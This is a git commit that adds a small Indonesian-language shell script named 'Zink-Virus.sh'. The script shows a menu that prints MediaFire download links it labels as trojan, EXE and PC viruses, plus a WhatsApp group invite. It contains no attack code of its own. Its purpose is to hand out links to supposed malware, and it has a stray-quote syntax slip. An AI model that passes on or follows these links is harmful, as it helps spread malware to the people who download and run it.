e6b14565d52d67a83e06b3acd96123d227e7948a
WhoAmI-T1T4N <92716161+WhoAmI-T1T4N@users.noreply.github.com>
2021-11-09 19:19:49 +0700

    Create Zink-Virus.sh

---
+++ Zink-Virus.sh
@@ -0,0 +1,54 @@
+#!/bin/sh
+
+green='\033[0;32m'
+greenlight='\033[32;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+black='\033[30;1m'
+yellow='\033[33;1m'
+echo $black "=================================="
+echo $red   "Author : Mr.T1T4N, Ft Brother Tersakiti"
+echo $red   "Team : Legend | Mugiwara"
+echo $red   "YT : T1T4N TZY"
+echo $black "===================================="
+echo $black "===================================="
+echo $yellow "1). Link-Virus"
+echo $yellow "2). Link-GC"
+echo $yellow "3). Exit"
+read -p "Jangan Lupa Pilih :" santai
+if [ $santai = "1" ]
+then
+echo $black "===================================="
+echo $green "1). Link Virus TROJANS"
+echo $green "2). Link Virus EXE"
+echo $green "3). Link Virus PC"
+echo $black "====================================="
+read -p "Pilih Link Virusnya :" santuy
+fi
+if [ $santuy = "1" ]
+then
+echo $yellow "Sedangg Menunggu....."
+echo $yellow "Sipp, Maaf Menunggu..."
+echo $yellow "Link : https://www.mediafire.com/file/kiwpmbv0cxsvqhu"
+echo $yellow "Maaf, Telah Menunggu"
+fi
+if [ $santuy = "2" ]
+then
+echo $yellow "Sedang Menunggu....."
+echo $yellow "Sipp, Maaf Menunggu"
+echo $yellow "Link : "https://www.mediafire.com/file/3b4a408l4440o04"
+echo $yellow "Maaf, Telah Menunggu"
+fi
+if [ $santuy = "3" ]
+then
+echo $yellow "Sedang, Menunggu......"
+echo $yellow "Sipp, Maaf Menunggu..."
+echo $yellow "Link : https://www.mediafire.com/file/kiwpmbv0cxsvqhu"
+echo $yellow "Maaf, Menunggu..."
+fi
+if [ $santai = "2" ]
+then
+echo $white "https://chat.whatsapp.com/EfnBy4ikANGHIxmyWSkVSC"
+echo $white "Silakan Join Link GCnya"
+echo $white "Thanks"
+fi
